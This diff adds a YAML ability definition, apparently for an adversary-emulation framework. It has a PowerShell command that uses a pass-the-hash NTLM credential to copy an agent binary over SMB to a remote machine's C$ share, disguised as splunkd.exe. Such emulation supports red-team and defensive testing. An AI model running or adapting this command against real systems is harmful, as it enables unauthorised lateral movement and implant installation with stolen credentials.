@@ -1,0 +1,26 @@
+- description: Copy Sandcat over SMB using Pass the Hash
+  id: ceb8fe56-e8ae-41f5-ab63-e6d32b1738ca
+  name: Copy Sandcat over SMB using Pass the Hash
+  tactic: lateral-movement
+  technique:
+    attack_id: T1550.002
+    name: Use Alternate Authentication Material
+  platforms:
+    windows:
+      psh:
+        command: |
+          Import-Module .\Invoke-SMBClient.ps1;Invoke-SMBClient -Domain #{domain.ad.name} 
+          -Username #{domain.user.name} -Hash #{domain.user.ntlm} -Action Put -Source 
+          sandcat.go-windows -Destination \\#{domain.computer.dnshostname}\C$\Users\Public\splunkd.exe;
+        payloads:
+          - sandcat.go-windows
+          - Invoke-SMBClient.ps1
+  requirements:
+    - plugins.stockpile.app.requirements.basic:
+      - source: domain.user.name
+        edge: has_hash
+        target: domain.user.ntlm
+    - plugins.stockpile.app.requirements.no_backwards_movement:
+       - source: domain.computer.dnshostname
+  
+
